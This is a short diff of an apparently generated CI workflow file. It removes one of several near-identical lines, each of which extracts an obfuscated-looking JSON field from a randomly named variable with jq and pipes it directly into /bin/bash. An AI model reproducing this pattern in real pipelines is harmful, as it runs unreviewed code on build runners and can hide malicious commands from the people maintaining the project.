@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$onp5" | jq -r .vsqq3958 | /bin/bash
           echo $nh4927 | jq -r .gjbv01268 | /bin/bash
           echo $qzjqe2 | jq -r .a88 | /bin/bash
-          echo $ttbm1 | jq -r .zagya52569 | /bin/bash
           echo $hrd909 | jq -r .hff48 | /bin/bash
           printf '%s' "$de46" | jq -r .v3 | /bin/bash
 
